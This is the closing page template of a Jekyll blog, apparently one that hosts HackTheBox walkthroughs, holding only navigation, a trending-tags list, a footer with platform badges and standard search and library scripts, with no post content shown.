  <div class="btn btn-outline-primary disabled"
    prompt="Newer">
    <p>-</p>
  </div>
  

</div>

    
      
      <!--  The comments switcher -->


    
  </div>
</div>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hacking/">Hacking</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
    
      
      <a class="post-tag" href="/tags/machine/">Machine</a>
    
      
      <a class="post-tag" href="/tags/walkthrough/">Walkthrough</a>
    
      
      <a class="post-tag" href="/tags/medium/">Medium</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/cve/">cve</a>
    
      
      <a class="post-tag" href="/tags/easy/">Easy</a>
    
      
      <a class="post-tag" href="/tags/c/">c</a>
    
      
      <a class="post-tag" href="/tags/chroot/">chroot</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    <!-- The Footer -->

<footer>
  <div class="container pl-lg-4 pr-lg-4">
    <div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3">
      <div class="footer-left">
        <p class="mb-0">
          © 2023
          <a href="https://twitter.com/AnkitKanojiya69">Ankit Kanojiya</a>.
          
          <span data-toggle="tooltip" data-placement="top"
            title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
          
        </p>
      </div>

      <div class="footer-right">
        <p class="mb-0">

          

          

          Powered by 
          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
           with 
          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
           theme.
        </p>
      </div>
    </div>
  </div>
  <div class="mt-auto d-flex flex-wrap justify-content-center align-items-center">
    <script src="https://www.hackthebox.eu/badge/1256978"></script>
    <script src="https://tryhackme.com/badge/50213"></script>
  </div>
</footer>


    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    
      <div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true"
        data-animation="true" data-autohide="false">
        <div class="toast-header">
          <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="toast-body text-center pt-0">
          <p class="pl-2 pr-2 mb-3">A new version of content is available.</p>
          <button type="button" class="btn btn-primary" aria-label="Update">
            Update
          </button>
        </div>
      </div>
    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No results found.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup & clipboard -->
  

  







  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>







  

  

  







  
    

    

  



  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script>








<script defer src="/assets/js/dist/post.min.js"></script>



<!-- commons -->

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script>




  </body>

</html>

